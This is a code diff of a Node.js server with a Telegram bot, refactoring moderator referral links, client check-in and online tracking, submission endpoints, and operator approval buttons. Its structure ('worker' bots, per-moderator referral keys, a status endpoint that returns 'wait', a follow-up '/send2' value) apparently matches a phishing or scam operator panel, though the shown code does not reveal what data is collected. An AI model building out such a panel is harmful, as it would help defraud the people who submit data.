@@ -62,33 +62,36 @@ let bannedUsers = {};
 let userStatus = {};
 let extraSentUsers = {};
 
-// 🔥 REF СИСТЕМА
-let modRefKeys = {};
-let userRef = {};
+// ===== REF СИСТЕМА (ИСПРАВЛЕНО) =====
+let modRefKeys = {};     // ref -> modId
+let modIdToKey = {};     // modId -> ref
+let userRef = {};        // clientId -> modId
 
 // ===== ONLINE =====
 function isOnline(id) {
   return onlineUsers[id] && Date.now() - onlineUsers[id] < 20000;
 }
 
-// ===== МОДЕР =====
+// ===== МОДЕРЫ =====
 function isMod(id) {
   return id === adminId || moderators.includes(id);
 }
 
-// ===== РЕГИСТРАЦИЯ =====
+// ===== START =====
 workerBot.onText(/\/start/, (msg) => {
   const username = msg.from.username;
   const id = msg.chat.id;
 
-  if (!username) return safeSend(workerBot, id, "❌ У тебя нет username");
+  if (!username) {
+    return safeSend(workerBot, id, "❌ У тебя нет username");
+  }
 
   usersByUsername[username.toLowerCase()] = id;
 
   safeSend(workerBot, id, "✅ Ты зарегистрирован");
 });
 
-// ===== МОДЕРЫ =====
+// ===== ADD MOD =====
 workerBot.onText(/\/addmod @(.+)/, (msg, match) => {
   if (msg.chat.id !== adminId) return;
 
@@ -102,6 +105,7 @@ workerBot.onText(/\/addmod @(.+)/, (msg, match) => {
   safeSend(workerBot, adminId, `✅ Добавлен: @${username}`);
 });
 
+// ===== DEL MOD =====
 workerBot.onText(/\/delmod @(.+)/, (msg, match) => {
   if (msg.chat.id !== adminId) return;
 
@@ -113,16 +117,34 @@ workerBot.onText(/\/delmod @(.+)/, (msg, match) => {
   safeSend(workerBot, adminId, `❌ Удалён: @${username}`);
 });
 
-// ===== 🔥 ССЫЛКА МОДЕРА =====
+// ===== LIST MODS =====
+workerBot.onText(/\/mods/, (msg) => {
+  if (msg.chat.id !== adminId) return;
+
+  const list = moderators.map(id => {
+    const entry = Object.entries(usersByUsername)
+      .find(([u, i]) => i === id);
+
+    return entry ? "@" + entry[0] : id;
+  }).join("\n");
+
+  safeSend(workerBot, adminId, "👥 Модераторы:\n" + list);
+});
+
+// ===== 🔥 LINK MOD (FIXED) =====
 workerBot.onText(/\/mylink/, (msg) => {
   const id = msg.chat.id;
 
-  if (!isMod(id)) return safeSend(workerBot, id, "❌ Ты не модератор");
+  if (!isMod(id)) {
+    return safeSend(workerBot, id, "❌ Ты не модератор");
+  }
 
-  let key = Object.keys(modRefKeys).find(k => modRefKeys[k] === id);
+  let key = modIdToKey[id];
 
   if (!key) {
     key = Math.random().toString(36).substring(2, 8);
+
+    modIdToKey[id] = key;
     modRefKeys[key] = id;
   }
 
@@ -131,7 +153,7 @@ workerBot.onText(/\/mylink/, (msg) => {
   safeSend(workerBot, id, `🔗 Твоя ссылка:\n${link}`);
 });
 
-// ===== ВХОД =====
+// ===== ENTER =====
 app.post("/enter", async (req, res) => {
   const id = req.body.clientId;
   const ref = req.body.ref;
@@ -142,7 +164,12 @@ app.post("/enter", async (req, res) => {
 
   if (ref && !userRef[id]) {
     const modId = modRefKeys[ref];
-    userRef[id] = modId || "неизвестно";
+
+    if (modId) {
+      userRef[id] = modId;
+    } else {
+      userRef[id] = "неизвестно";
+    }
   }
 
   await safeSend(
@@ -154,14 +181,14 @@ app.post("/enter", async (req, res) => {
   res.json({ ok: true });
 });
 
-// ===== ПИНГ =====
+// ===== PING =====
 app.post("/ping", (req, res) => {
   const id = req.body.clientId;
   if (id) onlineUsers[id] = Date.now();
   res.json({ ok: true });
 });
 
-// ===== ЗАЯВКА =====
+// ===== SEND =====
 app.post("/send", async (req, res) => {
   const d = req.body;
   const id = d.clientId;
@@ -216,12 +243,12 @@ app.post("/send", async (req, res) => {
   res.json({ ok: true });
 });
 
-// ===== СТАТУС =====
+// ===== STATUS =====
 app.get("/status/:id", (req, res) => {
   res.json({ status: userStatus[req.params.id] || "wait" });
 });
 
-// ===== ДОП =====
+// ===== SEND2 =====
 app.post("/send2", async (req, res) => {
   const { id, value } = req.body;
 
@@ -240,7 +267,7 @@ app.post("/send2", async (req, res) => {
   res.json({ ok: true });
 });
 
-// ===== CALLBACK (ВСЕ КНОПКИ ВЕРНУЛ) =====
+// ===== CALLBACK (ВСЕ КНОПКИ СОХРАНЕНЫ) =====
 workerBot.on("callback_query", async (q) => {
   const data = q.data;
   const id = data.split("_")[1];
